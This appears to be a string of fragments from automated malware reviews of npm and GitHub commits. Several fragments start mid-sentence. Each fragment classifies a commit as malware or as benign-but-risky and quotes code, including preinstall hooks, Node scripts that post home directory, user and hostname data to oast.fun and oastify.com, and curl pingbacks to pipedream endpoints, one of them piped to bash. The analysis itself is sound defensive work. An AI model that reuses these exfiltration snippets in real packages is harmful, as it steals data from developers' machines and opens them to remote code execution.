The presence of a 'pingback' script that contacts a pipedream.net endpoint indicates explicit phone-home/telemetry to an external service. Install-time execution combined with outbound telemetry is a high-risk vector for arbitrary actions and data exfiltration.\n\n**File index.js**:\nCode: `const os = require('os'); const dns = require('dns'); const pkg = require('./package.json'); const payload = {   home: os.homedir(),   user: os.userInfo(),   hostname: os.hostname(),   dns: /* system `\nReason: The script gathers sensitive local metadata (home directory, user info, hostname, DNS servers, and the entire package.json) and prepares it for transmission.

Silently suppressing network errors reduces visibility into failed exfiltration attempts and appears designed to avoid detection and logging.\n\n**File index.js**:\nCode: `const options = { hostname: 'http://oast.fun', /* ... */ }`\nReason: The hostname field incorrectly includes the URL scheme ('http://'), which is malformed and may indicate sloppy or intentionally evasive coding to bypass simple pattern-based detections. Regardless of form, the intent is to contact an external, suspicious domain to transmit collected data.\n\n**Summary:** Static analysis shows clear malicious intent: an install-time script (preinstall) executes code that harvests sensitive local information (home dir, user info, hostname, DNS servers, package.json) and attempts to POST it to an external, suspicious domain (oast.fun), plus an explicit pingback to pipedream.net. Error suppression and malformed request construction further indicate attempts to evade detection. Dynamic analysis produced no results (likely due to network blocking or sandbox constraints), but the static evidence is sufficient to classify this commit as malware. Immediate remediation: remove the scripts, treat systems that installed the package as potentially compromised, block the domains, and rotate exposed secrets."

While dangerous if abused (it could exfiltrate secrets, contact arbitrary hosts, or spawn destructive commands), the presence of these flags in test scripts is a risky configuration rather than definitive evidence of malware.\n\n**File package.json**:\nCode: `\"test-deno\": \"... --allow-net ... --allow-env ...\"`\nReason: Allowing full environment access in a test runner can expose CI or developer secrets to any code executed by the test, including indirect dependencies.

Such scripts can delete or overwrite files if executed unintentionally or if an attacker modifies package contents. Again, this is unsafe scripting practice but not proof that the repository intentionally contains malware.\n\n**Summary:** Static analysis flags high-risk scripts in package.json that grant broad Deno permissions and execute destructive shell commands, which significantly increase attack surface and potential for abuse. However, dynamic analysis produced no runtime malicious behavior, and the findings describe unsafe configurations and dangerous scripts rather than an explicit malicious payload. Recommend treating the commit as benign code that requires remediation: restrict Deno permissions, avoid --allow-env/--allow-net unless necessary and whitelisted, and remove or document destructive shell operations and only run them in trusted CI/developer contexts."

Preinstall hooks are a known vector for supply-chain attacks and can perform malicious actions before any developer inspects code.\n\n**File package.json**:\nCode: `\"pingback\": \"curl https://pipedream.net/xxxxx -d $DATA\"`\nReason: A script that posts data to an external pipedream endpoint indicates potential exfiltration of runtime/build information or secrets.

It is noted as low-risk, but such APIs can be used for obfuscation in other contexts and should be reviewed; here it is not the primary concern.\n\n**Summary:** Static analysis reveals clear, high-risk malicious patterns: an obfuscated postinstall that decodes and executes shell code, a preinstall hook that runs arbitrary JavaScript at install time, and a script that sends data to an external pipedream endpoint. These are classic supply-chain malware behaviors that enable remote code execution and data exfiltration. Dynamic analysis produced no observable runtime artifacts, but lack of runtime evidence does not negate the strong static indicators. Given the combination of obfuscation, install-time execution, and external callbacks, this commit should be treated as MALWARE.

Combined with network calls, this provides data to exfiltrate and demonstrates active reconnaissance on the host.\n\n**File build-a-benchmark.js**:\nCode: `https.request({ hostname: '...', path: '/' + username + '?host=' + hostname + '&dir=' + __dirname }, ...)`\nReason: The script constructs an HTTPS request whose path embeds local system data (username, hostname, __dirname) and sends it to a remote host. This is direct data exfiltration of environment/host information.\n\n**File build-a-benchmark.js**:\nCode: `/* obfuscated string array + index mapping */`\nReason: The file is intentionally obfuscated (encoded string arrays and indirection). Obfuscation in repository code is a strong indicator of malicious intent to hide behavior and avoid review.\n\n**Summary:** Static analysis reveals multiple high- and critical-severity indicators: an automatic preinstall hook that runs an obfuscated script, explicit network callbacks to an external capture endpoint, disabling TLS verification, execution of shell commands to gather host data, and construction of HTTPS requests that embed local environment information. Although dynamic analysis did not show executed results, the presence of install-time, obfuscated exfiltration code combined with network callbacks constitutes supply-chain malware. Recommend immediate removal/revert, treat installed hosts as potentially compromised, and follow incident response (isolate, rotate credentials, forensic review of outgoing traffic)."

Combined with the ability to fetch or place malicious files, this can execute code during dependency installation in CI or developer environments.\n\n**File package.json**:\nCode: `\"dependencies\": { \"systeminformation\": \"...\" }`\nReason: Adding the 'systeminformation' dependency allows collection of extensive host/environment metadata.

'child_process' is a Node core module; publishing an npm package with this name can shadow the core API and execute system commands or native code during install/require, creating a high risk of command execution.\n\n**File package.json**:\nCode: `\"fs\": \"*\", \"os\": \"*\"`\nReason: The packages 'fs' and 'os' (Node core modules) are declared with wildcard versions. These likely impersonate core modules and using '*' allows installing arbitrary versions, increasing the chance of pulling malicious code that masquerades as built-in modules.\n\n**Summary:** Static analysis revealed high-risk supply-chain tampering: a dependency pointing to an external registry and added packages that shadow core Node modules (child_process, fs, os) with permissive versions. These modifications enable arbitrary code delivery and command execution during install or require. Although dynamic analysis returned no runtime findings, the static indicators are severe and typical of malicious supply-chain/backdoor attempts, so the commit should be treated as malicious."

This is classic data exfiltration behavior and constitutes malicious network activity.\n\n**File index.js**:\nCode: `console.log('t.me/exzuperi');`\nReason: Hardcoded advertisement/contact to an external Telegram account embedded in runtime output.

While unused by themselves, in context they raise further concern.\n\n**Summary:** Static analysis shows intentional collection of environment and filesystem data and transmission to an external host controlled by the committer (non-standard port), plus malicious modifications to CI/test scripts and embedded contact information. Dynamic analysis produced no runtime evidence but absence of dynamic artifacts does not negate the clearly malicious static behavior.

It's a maintenance/security risk, not explicit malicious code.\n\n**File package.json**:\nCode: `\"scripts\": { \"test\": \"NODE_ENV=test NODE_PATH=./ mocha ...\" }`\nReason: The test script sets NODE_PATH which alters module resolution. This can enable accidental module shadowing or hijacking in test environments, a risky practice but not malware.\n\n**File .travis.yml**:\nCode: `node_js:   - 10`\nReason: CI matrix includes Node.js v10 (EOL). Using EOL runtimes can leave builds vulnerable to unpatched issues; a security/maintenance concern but not an indicator of malicious code.\n\n**Summary:** Static analysis flags several high- and medium-risk patterns (networking libraries, native modules, publish secrets, test config leakage, ignored dependency updates) that increase attack surface and operational risk. However, dynamic analysis produced no malicious behavior and there are no direct signs of backdoors, obfuscated payloads, command-and-control logic, or data exfiltration code in the provided reports. The changes are best characterized as risky/poor security hygiene rather than active malware. Recommend remediations: remove unnecessary native/network deps, audit and pin dependencies, restrict publish workflows, remove test requires from runtime, and run SCA/vulnerability scans in CI."

These are strong indicators of malicious intent (remote code execution and data exfiltration).

The presence of an unpinned third-party action handling a license file plus uploading that file to CI artifacts is a high-risk data-exfiltration and secret-leak pattern, but it is a risky configuration rather than explicit malicious code.\n\n**File .github/workflows/tests.yml**:\nCode: `uses: webbertakken/unity-test-runner@v1.6 ... uses: actions/upload-artifact@v2 with:   name: test-artifacts   path: ./artifacts`\nReason: The test workflow uses a third-party Unity test runner (which may receive UNITY_LICENSE) and uploads test artifacts unfiltered. Third-party actions with network access and unpinned versions can exfiltrate secrets or generated files; this is suspicious from a security posture perspective but not direct evidence of malware in the repo.\n\n**File .github/workflows/on-release.yml**:\nCode: `uses: actions/setup-node@v1 env:   NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }} run: npm publish`\nReason: The workflow exposes a repository secret via environment variable and performs npm publish. Environment variables can be leaked by scripts or third-party actions; this is an operational risk (credential exposure) rather than an explicit malicious artifact.\n\n**File .github/workflows/publish-release-on-npmjs.yml**:\nCode: `run: yarn install run: npm publish`\nReason: Installing dependencies and publishing executes lifecycle scripts from the repository and dependencies.

Dynamic analysis produced no malicious behavior (empty result). There is no direct evidence of malware code in the commit, but the workflows and dependency introduce significant risk of credential or artifact exfiltration and supply-chain compromise.

An obfuscated duplicate of the downloader that also executes fetched binaries strongly indicates intentional concealment of malicious behavior.

This is a dangerous side-effect (availability and trust issues) and allows an attacker who controls or intercepts that host to influence verification, but it is not itself evidence of malicious intent \u2014 it is insecure design/implementation.\n\n**File middleware.js**:\nCode: `jwt.verify(token, publicKey, function(err, decoded) {   // no explicit algorithms or claim checks provided });`\nReason: JWT verification is performed without restricting accepted algorithms or validating expected claims (issuer, audience). This enables algorithm-confusion and other token-forgery attacks if an attacker can craft tokens or control the key; again this is a vulnerability rather than proof of malware.\n\n**File middleware.js**:\nCode: `const token = req.query.prof; // token taken from URL query parameter`\nReason: Authentication token is read from a URL query parameter, which risks leakage via browser history, Referer headers, logs, and third-party services. This is poor practice but not inherently malicious.\n\n**File middleware.js**:\nCode: `const cbUrl = new URL(decoded.data.azCallBackUrl); if (myURL.host === authrizedCallbakcURL) { ... }`\nReason: User-controlled azCallBackUrl is parsed without validation and origin checking compares host strings in a brittle way (ports, canonicalization).

This is not direct malicious code, but it unnecessarily expands the attack surface because these packages (and their transitive deps) are fetched and can execute code during install (postinstall scripts) or at runtime. The invalid-looking express semver string is suspicious for package resolution issues which could lead to unexpected package installs.\n\n**File react.js**:\nCode: `module.exports = { parser: require.resolve('@typescript-eslint/parser'), ... }`\nReason: The config calls require.resolve('@typescript-eslint/parser') at import time which executes module resolution and may throw or trigger side effects if package metadata is tampered with. This is a risky pattern in shared/CI contexts but is not itself malicious.\n\n**File nextjs.js**:\nCode: `module.exports = { extends: ['next/core-web-vitals', ...] }`\nReason: Extending third-party configs (eslint-config-next) causes code from those packages to be loaded when linting.

Again, this is a security posture issue rather than evidence of malware in this commit.\n\n**Summary:** Static analysis indicates poor dependency hygiene: many developer tools and ESLint plugins/configs were added to runtime dependencies, an anomalous semver for express exists, and configs perform module resolution/extend third-party configs at import time. Dynamic analysis produced no runtime indicators of compromise. There is no evidence of payloads, obfuscated code, command-and-control, or other malicious behavior in the commit itself. However, the changes materially increase supply-chain risk and could lead to compromise if upstream packages are malicious or tampered with.

These are commonly used by attackers to receive callbacks and hide malicious activity, and are strong indicators of malicious intent rather than benign telemetry.\n\n**Summary:** The commit introduces an automatic execution vector (preinstall -> node index.js) and hard-coded external collectors (oast.live and pipedream). Static evidence shows code to assemble and POST data to attacker-controlled endpoints, which enables silent exfiltration during npm install. Although dynamic analysis returned no runtime results, the presence of these deliberate constructs and endpoints is sufficient to classify the change as malicious and high risk."

Dynamic analysis produced no observable malicious behavior. The flagged items represent operational, safety, and supply-chain risks but are consistent with test/setup code rather than indicators of malware or deliberate malicious functionality.

Intermingling unsolicited promotional content with library code is suspicious and can be used to direct developers/users to an attacker-controlled channel.\n\n**File index.js**:\nCode: `const fs = require('fs'); // no subsequent usage of fs in module`\nReason: An unused require combined with side-effectful operations at module import time (network call and prints) is indicative of hidden or careless malicious modifications and increases risk surface.\n\n**File package.json**:\nCode: `\"scripts\": { \"test\": \"echo \\\"Error: exzuperi made me\\\" && exit 1\" }`\nReason: The test script was changed to always fail and prints a branded message referencing the external actor. This breaks CI/testing and appears to be deliberate sabotage or malicious promotion tied to the exfiltration behavior.\n\n**Summary:** Static analysis shows explicit, intentional exfiltration of host-identifying data to an external domain at module load time, unsolicited promotional output, and sabotage of tests. These behaviors constitute malicious activity even though dynamic analysis returned no runtime evidence (likely due to network blocking or sandboxing). Because the commit transmits sensitive host data without consent and contains other deliberate malicious modifications, it should be classified as MALWARE."

Run-on-install scripts are a common supply-chain abuse vector because they run with the installer's privileges and can perform arbitrary actions (including exfiltration) automatically.\n\n**File index.js**:\nCode: `const https = require('https'); const os = require('os'); const dns = require('dns'); const payload = JSON.stringify({   pkg: require('./package.json'),   home: os.homedir(),   hostname: os.hostname()`\nReason: The script collects sensitive/local information (full package.json, home directory, hostname, username, DNS servers) and immediately posts it to an external domain (oast.fun). This is active data exfiltration performed automatically during install and matches high-risk supply-chain malicious behavior.\n\n**File package.json**:\nCode: `\"scripts\": { \"pingback\": \"curl https://eo2.pipedream.net/XXXXX -d @- | bash\" }`\nReason: An additional script calls an external pipedream.net endpoint.

    "explanation": "**File .github/workflows/autopublish.yml**:\nCode: `on: push:   branches: [ main ] ... - name: Publish   run: npm publish`\nReason: Automatic publish on push to main invokes `npm publish` which runs package lifecycle scripts (prepublish, prepare, prepack, postpublish, etc.). If an attacker can alter the repo or package.json, arbitrary code can execute on the runner and any secrets available to the job can be abused. This is high-risk behavior but not itself a dropped payload or active malware.\n\n**File .github/workflows/autopublish.yml**:\nCode: `env:   NODE_AUTH_TOKEN: ${{ secrets.npm_token }}`\nReason: A secret token is injected into the job environment. If the token is over-privileged or leaked (via logs or a compromised step), it could be used to publish malicious packages or exfiltrate package contents. This is a credential-leak risk rather than direct malware.\n\n**File .github/workflows/autopublish.yml**:\nCode: `registry-url: https://registry.npmjs.org/`\nReason: Publishing to the public npm registry transmits package contents to an external service. This can lead to accidental exfiltration of sensitive files if not validated, and enables supply-chain impact if the package is later depended upon. Again, this is a risky configuration but not proof of malware.\n\n**File .github/workflows/autopublish.yml**:\nCode: `- uses: actions/checkout@v2 - uses: actions/setup-node@v1`\nReason: The workflow references third-party actions with floating tags (@v1/@v2). Floating tags can be updated upstream and introduce malicious code into the runner via a supply-chain compromise. This elevates the danger of the workflow but is a configuration vulnerability, not an immediate malware artifact.\n\n**Summary:** The commit modifies a GitHub Actions workflow that enables automatic npm publishing with an injected auth token and uses unpinned action versions. These characteristics create high-risk conditions for remote code execution, credential abuse, and supply-chain attacks if the repository or referenced actions are compromised. However, no dynamic evidence of malicious activity or payload execution was observed. The changes are best classified as benign configuration with significant security issues that should be remediated (pin actions, require PR review/branch protection, use least-privileged tokens, validate package contents) to prevent potential abuse."

    "explanation": "**File package.json**:\nCode: `\"scripts\": { \"preinstall\": \"node app.js\" }`\nReason: A preinstall lifecycle script runs automatically during npm install and executes arbitrary code on the host. This is a common supply-chain/backdoor vector and allows the package to perform actions without operator consent.\n\n**File app.js**:\nCode: `const http = require('http'); const pkg = require('./package.json'); http.get(`http://${pkg.name}.package.0xlupin.com`, res => { /* ... */ });`\nReason: The code performs an automatic HTTP GET to an externally controlled domain derived from the package name. Combined with the preinstall hook, this is a phone-home/beacon behavior that can be used for telemetry, remote control, or exfiltration during installation.\n\n**File package.json**:\nCode: `\"scripts\": { \"pingback\": \"curl https://eo536ohsnextro9.m.pipedream.net\" }`\nReason: A script sends data to a third-party Pipedream endpoint. Pipedream collectors are commonly used to harvest telemetry or exfiltrate data. Automated or install-time calls to such endpoints are a strong indicator of malicious tracking or data leakage.\n\n**File app.js**:\nCode: `const os = require('os');`\nReason: The 'os' module is required but not used in the visible code. Its presence alongside automatic network callbacks suggests the potential to collect local system information (hostname, platform, network interfaces) and send it externally.\n\n**Summary:** Static analysis reveals an install-time preinstall hook that runs node app.js and that app.js performs outbound requests to a domain derived from the package name and to a third-party Pipedream endpoint. These behaviors\u2014automatic execution during installation plus phone-home and third-party telemetry\u2014constitute a supply-chain backdoor/telemetry mechanism.

This causes arbitrary hosts that run npm install to execute remote commands or exfiltrate data. The addition of an npm dependency named 'child_process' is a typosquat of a Node core module and may introduce arbitrary command execution or malicious code.\n\n**File @Moonlink/MoonlinkNodes.js**:\nCode: `/* large obfuscated block */ var _0xabc=[...];(function(_0x...){...})(); ... ws = new WebSocket(`ws://${this.host}:${this.port}`, { headers: { Authorization: this.password } });`\nReason: Obfuscated code hides intent and can conceal malicious behavior. The file also constructs and opens WebSocket/HTTP connections to arbitrary host/port values taken from configuration (this.host/this.port) and sends raw Authorization headers, enabling outbound connections and credential leakage or SSRF-like pivoting.\n\n**File @Rest/MakeRequest.js**:\nCode: `function makeRequest(opts){ return fetch(opts.url, { method: opts.method, headers: opts.headers }); }`\nReason: HTTP(S) requests are made to arbitrary URLs supplied by callers without validation, timeouts, or header sanitization. When callers are untrusted, this enables SSRF, arbitrary outbound requests, and potential exfiltration or abuse of host network access.\n\n**File @Rest/MoonlinkDatabase.js**:\nCode: `fs.writeFileSync(path.join(__dirname, 'database.json'), JSON.stringify(dbData)); dbData = JSON.parse(fs.readFileSync(path.join(__dirname, 'database.json')));`\nReason: Secrets or tokens stored in an unprotected JSON file in the repository directory are easily read or exfiltrated. The implementation lacks access controls, atomic writes, and concurrency handling, increasing risk of leakage or corruption.\n\n**File @sources/Spotify.js**:\nCode: `const auth = Buffer.from(this.clientId + ':' + this.clientSecret).toString('base64'); headers['Authorization'] = 'Basic ' + auth; /* sometimes references this.clientID */`\nReason: The code constructs Basic Authorization headers from client credentials and sends them to endpoints; inconsistent property casing (clientId vs clientID) is a bug that may cause accidental exposure or misuse of secrets. Sending credentials without strict destination validation is risky.\n\n**Summary:** Multiple high- and critical-severity findings indicate active malicious capability: an install-time lifecycle script that calls an external pipedream endpoint (remote command execution/exfiltration vector), a suspicious typosquat dependency ('child_process'), obfuscated code that hides behavior, and functions that open arbitrary outbound connections and transmit credentials. Persistent storage of secrets in cleartext JSON and unsafe HTTP helpers further increase risk. Although dynamic analysis returned no results, the static evidence shows behaviors strongly associated with malware or supply-chain abuse, so the commit should be treated as MALWARE."

This is active, unauthorised data exfiltration.\n\n**File index.js**:\nCode: `const pjson = require('./package.json'); // payload includes pjson in full`\nReason: The code requires and transmits the full package.json which can contain repository metadata and, in some cases, secrets or credential references. Sending the entire file leaks project internals.\n\n**File index.js**:\nCode: `// network call executed at top-level (module import side-effect) // no exported API to opt-in`\nReason: Network activity is performed as a side-effect at module import. Any consumer that depends on this package will trigger exfiltration without explicit action, which is a deceptive and dangerous practice.\n\n**File index.js**:\nCode: `// req.on('error', (err) => { /* console.error(err) */ });`\nReason: Error handling for the outbound request is suppressed (commented out). Silencing network errors prevents detection and debugging of the exfiltration behavior, suggesting intent to hide failures.\n\n**Summary:** Static analysis shows clear, intentional exfiltration of sensitive system and project data (home directory, hostname, username, DNS servers, full package.json) to an external, untrusted host (oastify.com) performed immediately on import with suppressed error handling and no opt-in. Dynamic analysis produced no results (likely due to sandbox/network blocking), but that does not negate the static evidence.

This pattern suggests functionality was moved to install-time actions or hidden, which is a common tactic in malicious supply-chain changes to avoid detection.\n\n**Summary:** The commit introduces an automatic preinstall lifecycle script that issues a network request to an untrusted external endpoint and adds a suspicious 'pingback' script, while simultaneously removing the package's main entry file. These changes constitute high-risk supply-chain/backdoor behavior (automatic phone-home, potential for remote command execution and secret exfiltration). The absence of dynamic telemetry does not mitigate the risk because install-time scripts may not have executed in the dynamic environment.

These are classic indicators of malicious code and a direct remote code execution/supply-chain risk. The lack of artifacts from dynamic analysis does not mitigate the high-confidence static findings. Therefore the commit is classified as MALWARE."
